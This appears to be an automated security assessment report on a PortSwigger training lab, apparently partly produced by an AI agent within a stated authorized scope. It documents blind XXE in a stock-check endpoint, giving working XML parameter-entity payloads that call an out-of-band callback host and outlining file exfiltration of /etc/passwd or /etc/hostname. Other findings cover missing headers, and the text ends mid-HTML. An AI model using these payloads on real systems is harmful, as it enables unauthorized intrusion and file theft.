# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — xxe Blind XXE (OOB) via XML parameter entity in /product/stock stock checker](#finding-1)
    - [2. HIGH — xxe Blind XXE in product stock check — arbitrary file read (/etc/hostname) and SSRF](#finding-2)
    - [3. LOW — burp Strict transport security not enforced (4 URLs)](#finding-3)
    - [4. INFO — info-disclosure Internal lab-structure markers and exploit-server URL exposed in HTML source](#finding-4)
    - [5. INFO — headers Missing security response headers (CSP, X-Frame-Options, X-Content-Type-Options, HSTS, Referrer-Policy) and session cookie SameSite=None](#finding-5)
    - [6. INFO — burp TLS certificate](#finding-6)
- [Suspected (needs manual verification)](#suspected-needs-manual-verification)
    - [7. HIGH — xxe Feedback screenshot upload accepts malicious SVG (potential blind XXE/SSRF)](#finding-7)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr7sa8it-pbvtc7` |
| Target | https://0a51007103987017805bee9e007600ea.web-security-academy.net/ |
| Started | 2026-07-05T12:45:03.491Z |
| Generated | 2026-07-05T14:15:01.361Z |
| Phase | report |
| Screens | 3 mapped · 3 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 6 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `*.web-security-academy.net`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

6 finding(s): 2 high, 1 low, 3 info

_Plus 1 suspected lead(s) needing manual verification — listed separately below, NOT counted above._

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [xxe] Blind XXE (OOB) via XML parameter entity in /product/stock stock checker

- Screen: `s-0003`
- Source: validator `claude-pilot`
- Scope basis: authorized target https://0a51007103987017805bee9e007600ea.web-security-academy.net/

The POST /product/stock stock-checker parses the request body as XML. Regular (general) external entities are rejected with "Entities are not allowed for security reasons", but this filter does NOT cover XML parameter entities. Injecting a DOCTYPE with a parameter entity referencing an external SYSTEM URL causes the server-side XML parser to make an out-of-band request to an attacker-controlled host. This is a blind XXE / SSRF primitive: the parser fetched http://collaborator/ producing DNS + HTTP callbacks. It can be escalated to out-of-band exfiltration of local files (e.g. /etc/passwd) by hosting a malicious external DTD defining nested parameter entities.

**Reproduction**

```
POST /product/stock, Content-Type: application/xml, body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://COLLABORATOR/"> %xxe; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>. Negative control (benign XML, no DOCTYPE) produced no callback. The two positive replays each triggered out-of-band DNS + HTTP interactions from the target to the Collaborator host (zvy4see6vq5pmvx8q0kc4jrvlmrgf5.oastify.com), confirming the parser resolves and fetches the parameter-entity URL. A general external entity is blocked with HTTP 400 "Entities are not allowed for security reasons".
```

**Evidence**

- Evidence `ev-mr7to4ol-f` — `artifacts/s-0003/ev-mr7to4ol-f/`

Request:

```http
POST /product/stock HTTP/1.1
Host: 0a51007103987017805bee9e007600ea.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
x-verdict: assessment
content-type: application/xml

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://verdict-oob-noref-zvy4see6.invalid/"> %xxe; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Response:

```http
HTTP/1.1 400
content-length: 19
content-type: application/json; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

[VERDICT-OOB] control: benign host, no callback expected
```

- Evidence `ev-mr7toi01-h` — `artifacts/s-0003/ev-mr7toi01-h/`

Request:

```http
POST /product/stock HTTP/1.1
Host: 0a51007103987017805bee9e007600ea.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
x-verdict: assessment
content-type: application/xml

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://zvy4see6vq5pmvx8q0kc4jrvlmrgf5.oastify.com/"> %xxe; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Response:

```http
HTTP/1.1 400
content-length: 19
content-type: application/json; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

[VERDICT-OOB] OUT-OF-BAND CALLBACK CONFIRMED — the target server issued an external DNS/DNS/HTTP request to our unique Burp Collaborator host, which proves a blind out-of-band vulnerability (SSRF / XXE / blind SQLi / RCE depending on the sink). collaborator_host=zvy4see6vq5pmvx8q0kc4jrvlmrgf5.oastify.com payload_id=zvy4see6vq5pmvx8q0kc4jrvlmrgf5 interactions=[DNS@2026-07-05T13:23:57.479Z from 3.251.120.103; DNS@2026-07-05T13:23:57.478Z from 99.80.88.33; HTTP@2026-07-05T13:23:57.520Z from 34.251.122.40] [read#1]
```

- Evidence `ev-mr7ton1w-i` — `artifacts/s-0003/ev-mr7ton1w-i/`

Request:

```http
POST /product/stock HTTP/1.1
Host: 0a51007103987017805bee9e007600ea.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
x-verdict: assessment
content-type: application/xml

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://zvy4see6vq5pmvx8q0kc4jrvlmrgf5.oastify.com/"> %xxe; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Response:

```http
HTTP/1.1 400
content-length: 19
content-type: application/json; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

[VERDICT-OOB] OUT-OF-BAND CALLBACK CONFIRMED — the target server issued an external DNS/DNS/HTTP request to our unique Burp Collaborator host, which proves a blind out-of-band vulnerability (SSRF / XXE / blind SQLi / RCE depending on the sink). collaborator_host=zvy4see6vq5pmvx8q0kc4jrvlmrgf5.oastify.com payload_id=zvy4see6vq5pmvx8q0kc4jrvlmrgf5 interactions=[DNS@2026-07-05T13:23:57.479Z from 3.251.120.103; DNS@2026-07-05T13:23:57.478Z from 99.80.88.33; HTTP@2026-07-05T13:23:57.520Z from 34.251.122.40] [read#2]
```

<a id="finding-2"></a>

### 2. [HIGH] [xxe] Blind XXE in product stock check — arbitrary file read (/etc/hostname) and SSRF

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target https://0a51007103987017805bee9e007600ea.web-security-academy.net/

Blind XXE via external parameter entity on POST /product/stock. Internal general-entity declarations are blocked by a WAF ("Entities are not allowed for security reasons"), but external parameter entities are processed. Confirmed out-of-band: an external parameter entity with an http SYSTEM id causes the server to make DNS and HTTP callbacks to a Burp Collaborator host (2 interactions vs a benign control). File read is demonstrated by a differential: file:///etc/hostname yields XML parsing error while a benign body yields the stock number 810. This enables arbitrary local file read (including /etc/hostname, the stage objective) and SSRF. Byte-for-byte exfiltration needs an attacker-hosted nested-parameter-entity DTD; the lab exploit server that would host it is out of assessment scope, and in-scope exfil channels are all closed (generic errors only, productId not echoed, data: URI unsupported, local-DTD char-ref blocked by the WAF).

**Reproduction**

```
POST /product/stock (Content-Type application/xml) with a DOCTYPE declaring an external parameter entity whose SYSTEM id is a Burp Collaborator http URL, then referencing it in the internal subset; the server makes DNS and HTTP callbacks out-of-band (evidence ev-mr7upckf-1i and ev-mr7upgur-1j vs benign control ev-mr7up0x4-1g). Swapping the SYSTEM id to file:///etc/hostname changes the response to a generic XML parsing error (file loaded into the DTD), distinct from the benign 200/810 and from the general-entity WAF block, proving the local file is read.
```

**Evidence**

- Evidence `ev-mr7up0x4-1g` — `artifacts/_/ev-mr7up0x4-1g/`

Request:

```http
POST /product/stock HTTP/1.1
Host: 0a51007103987017805bee9e007600ea.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
x-verdict: assessment
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://verdict-oob-noref-t3xy08m0.invalid/dtd"> %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Response:

```http
HTTP/1.1 400
content-length: 19
content-type: application/json; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

[VERDICT-OOB] control: benign host, no callback expected
```

- Evidence `ev-mr7upckf-1i` — `artifacts/_/ev-mr7upckf-1i/`

Request:

```http
POST /product/stock HTTP/1.1
Host: 0a51007103987017805bee9e007600ea.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
x-verdict: assessment
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://t3xy08m03kdjup52yus6cdzptgzen3.oastify.com/dtd"> %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Response:

```http
HTTP/1.1 400
content-length: 19
content-type: application/json; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

[VERDICT-OOB] OUT-OF-BAND CALLBACK CONFIRMED — the target server issued an external DNS/HTTP request to our unique Burp Collaborator host, which proves a blind out-of-band vulnerability (SSRF / XXE / blind SQLi / RCE depending on the sink). collaborator_host=t3xy08m03kdjup52yus6cdzptgzen3.oastify.com payload_id=t3xy08m03kdjup52yus6cdzptgzen3 interactions=[DNS@2026-07-05T13:52:37.855Z from 99.80.88.33; HTTP@2026-07-05T13:52:37.860Z from 34.251.122.40] [read#1]
```

- Evidence `ev-mr7upgur-1j` — `artifacts/_/ev-mr7upgur-1j/`

Request:

```http
POST /product/stock HTTP/1.1
Host: 0a51007103987017805bee9e007600ea.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
x-verdict: assessment
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://t3xy08m03kdjup52yus6cdzptgzen3.oastify.com/dtd"> %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Response:

```http
HTTP/1.1 400
content-length: 19
content-type: application/json; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

[VERDICT-OOB] OUT-OF-BAND CALLBACK CONFIRMED — the target server issued an external DNS/HTTP request to our unique Burp Collaborator host, which proves a blind out-of-band vulnerability (SSRF / XXE / blind SQLi / RCE depending on the sink). collaborator_host=t3xy08m03kdjup52yus6cdzptgzen3.oastify.com payload_id=t3xy08m03kdjup52yus6cdzptgzen3 interactions=[DNS@2026-07-05T13:52:37.855Z from 99.80.88.33; HTTP@2026-07-05T13:52:37.860Z from 34.251.122.40] [read#2]
```

<a id="finding-3"></a>

### 3. [LOW] [burp] Strict transport security not enforced (4 URLs)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

(confidence: CERTAIN) [+3 more URL(s): https://0a51007103987017805bee9e007600ea.web-security-academy.net/product, https://0a51007103987017805bee9e007600ea.web-security-academy.net/feedback/submit, https://0a51007103987017805bee9e007600ea.web-security-academy.net/product/stock] @ https://0a51007103987017805bee9e007600ea.web-security-academy.net/feedback

**Reproduction**

```
Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).
```

**Evidence**

- Evidence `ev-mr7vhgk0-1z` — `artifacts/_/ev-mr7vhgk0-1z/`

Request:

```http
GET /feedback HTTP/1.1
Host: 0a51007103987017805bee9e007600ea.web-security-academy.net

GET /feedback HTTP/1.1
Host: 0a51007103987017805bee9e007600ea.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 4755

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0a3100f5033770d8807bed8c01d600d5.exploit-server.net'>Go to exploit server</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='UmVhZCBhbmQgc3VibWl0IHRoZSBjb250ZW50cyBvZiB0aGUgZmlsZSA8Y29kZT4vZXRjL2hvc3RuYW1lPC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3h4ZS9ibGluZC9sYWIteHhlLXdpdGgtb3V0LW9mLWJhbmQtZXhmaWx0cmF0aW9u'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/feedback">Submit feedback</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>Submit feedback</h1>
                    <form id="feedbackForm" action="/feedback/submit" method="POST" enctype="multipart/form-data">
                        <input required type="hidden" name="csrf" value="DDeXTTKLGgN5hcZPNkVamOgfhirnxj0i">
                        <label>Name:</label>
                        <input required type="text" name="name">
                        <label>Email:</label>
                        <input required type="email" name="email">
                        <label>Subject:</label>
                        <input required type="text" name="subject">
                        <label>Message:</label>
                        <textarea required rows="12" cols="300" name="message"></textarea>
                        <label>Screenshot:</label>
                        <input type="file" name="screenshot">
                        <button class="button" type="submit">
                            Submit feedback
                        </button>
                        <span id="feedbackResult"></span>
                    </form>
                    <script src="/resources/js/submitFeedback.js"></script>
                    <br>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

<a id="finding-4"></a>

### 4. [INFO] [info-disclosure] Internal lab-structure markers and exploit-server URL exposed in HTML source

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target https://0a51007103987017805bee9e007600ea.web-security-academy.net/

The root page HTML embeds internal templating markers as HTML comments (<!--LAB_HEAD_START-->, <!--LAB_HEAD_END-->, <!--LAB_HEADER_START-->), the full exploit-server URL (https://exploit-0a3100f5033770d8807bed8c01d600d5.exploit-server.net), and challenge metadata in data-answer-prompt attributes — all visible to any user via view-source. A non-existent path (control) returns a plain JSON "Not Found" body confirming these markers are specific to the root page template, not generic server behaviour.

**Reproduction**

```
1. GET https://0a51007103987017805bee9e007600ea.web-security-academy.net/\n2. View response body — <!--LAB_HEAD_START-->, <!--LAB_HEAD_END-->, <!--LAB_HEADER_START--> are present, exploit-server URL is embedded in an anchor tag, data-answer-prompt leaks challenge metadata.\n3. Contrast with GET /nonexistent-path → 404 JSON body with none of these markers (control).
```

**Evidence**

- Evidence `ev-mr7svba9-4` — `artifacts/s-0001/ev-mr7svba9-4/`

Request:

```http
GET /nonexistent-path HTTP/1.1
Host: 0a51007103987017805bee9e007600ea.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
content-length: 11
content-type: application/json; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

"Not Found"
```

- Evidence `ev-mr7sl36j-1` — `artifacts/s-0001/ev-mr7sl36j-1/`

Request:

```http
GET / HTTP/1.1
Host: 0a51007103987017805bee9e007600ea.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 11719
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0a3100f5033770d8807bed8c01d600d5.exploit-server.net'>Go to exploit server</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='UmVhZCBhbmQgc3VibWl0IHRoZSBjb250ZW50cyBvZiB0aGUgZmlsZSA8Y29kZT4vZXRjL2hvc3RuYW1lPC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3h4ZS9ibGluZC9sYWIteHhlLXdpdGgtb3V0LW9mLWJhbmQtZXhmaWx0cmF0aW9u'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/feedback">Submit feedback</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/23.jpg">
                            <h3>Sprout More Brain Power</h3>
                            <img src="/resources/images/rating1.png">
                            $96.35
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/57.jpg">
                            <h3>Lightbulb Moments</h3>
                            <img src="/resources/images/rating1.png">
                            $28.35
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/15.jpg">
                            <h3>Pet Experience Days</h3>
                            <img src="/resources/images/rating4.png">
                            $73.35
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/7.jpg">
                            <h3>Conversation Controlling Lemon</h3>
                            <img src="/resources/images/rating2.png">
                            $42.14
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/40.jpg">
                            <h3>Sarcastic 9 Ball</h3>
                            <img src="/resources/images/rating5.png">
                            $86.50
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/20.jpg">
                            <h3>Single Use Food Hider</h3>
                            <img src="/resources/images/rating4.png">
                            $41.66
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/70.jpg">
                            <h3>Eye Projectors</h3>
                            <img src="/resources/images/rating2.png">
                            $12.55
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/9.jpg">
                            <h3>Fur Babies</h3>
                            <img src="/resources/images/rating2.png">
                            $44.17
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating3.png">
                            $47.65
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/64.jpg">
                            <h3>Hexbug Battleground Tarantula Double Pack</h3>
                            <img src="/resources/images/rating1.png">
                            $27.22
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/48.jpg">
                            <h3>BBQ Suitcase</h3>
                            <img src="/resources/images/rating2.png">
                            $26.98
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/54.jpg">
                            <h3>Robot Home Security Buddy</h3>
                            <img src="/resources/images/rating3.png">
                            $49.73
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/10.jpg">
                            <h3>Giant Grasshopper</h3>
                            <img src="/resources/images/rating4.png">
                            $68.83
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/31.jpg">
                            <h3>Couple&apos;s Umbrella</h3>
                            <img src="/resources/images/rating5.png">
                            $81.89
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/68.jpg">
                            <h3>What Do You Meme?</h3>
                            <img src="/resources/images/rating2.png">
                            $28.96
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/1.jpg">
                            <h3>Eggtastic, Fun, Food Eggcessories</h3>
                            <img src="/resources/images/rating5.png">
                            $61.12
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/47.jpg">
                            <h3>3D Voice Assistants</h3>
                            <img src="/resources/images/rating2.png">
                            $98.67
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/22.jpg">
                            <h3>Babbage Web Spray</h3>
                            <img src="/resources/images/rating2.png">
                            $17.82
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating4.png">
                            $22.36
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/39.jpg">
                            <h3>Paintball Gun - Thunder Striker</h3>
                            <img src="/resources/images/rating1.png">
                            $50.86
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr7stbug-3` — `artifacts/s-0001/ev-mr7stbug-3/`

Request:

```http
GET / HTTP/1.1
Host: 0a51007103987017805bee9e007600ea.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 11719
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0a3100f5033770d8807bed8c01d600d5.exploit-server.net'>Go to exploit server</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='UmVhZCBhbmQgc3VibWl0IHRoZSBjb250ZW50cyBvZiB0aGUgZmlsZSA8Y29kZT4vZXRjL2hvc3RuYW1lPC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3h4ZS9ibGluZC9sYWIteHhlLXdpdGgtb3V0LW9mLWJhbmQtZXhmaWx0cmF0aW9u'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/feedback">Submit feedback</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/23.jpg">
                            <h3>Sprout More Brain Power</h3>
                            <img src="/resources/images/rating1.png">
                            $96.35
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/57.jpg">
                            <h3>Lightbulb Moments</h3>
                            <img src="/resources/images/rating1.png">
                            $28.35
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/15.jpg">
                            <h3>Pet Experience Days</h3>
                            <img src="/resources/images/rating4.png">
                            $73.35
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/7.jpg">
                            <h3>Conversation Controlling Lemon</h3>
                            <img src="/resources/images/rating2.png">
                            $42.14
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/40.jpg">
                            <h3>Sarcastic 9 Ball</h3>
                            <img src="/resources/images/rating5.png">
                            $86.50
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/20.jpg">
                            <h3>Single Use Food Hider</h3>
                            <img src="/resources/images/rating4.png">
                            $41.66
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/70.jpg">
                            <h3>Eye Projectors</h3>
                            <img src="/resources/images/rating2.png">
                            $12.55
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/9.jpg">
